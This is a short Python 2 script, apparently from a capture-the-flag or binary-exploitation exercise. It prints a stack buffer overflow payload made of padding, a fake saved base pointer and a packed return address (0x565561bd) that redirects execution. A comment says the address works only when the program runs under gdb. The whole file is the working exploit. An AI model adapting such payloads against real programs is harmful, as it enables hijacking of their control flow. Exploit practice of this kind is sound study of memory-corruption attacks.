import struct
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGG"
ebp = "AAAA"
eip = struct.pack("I", 0x565561bd) #running from gdb only!

print padding + ebp + eip
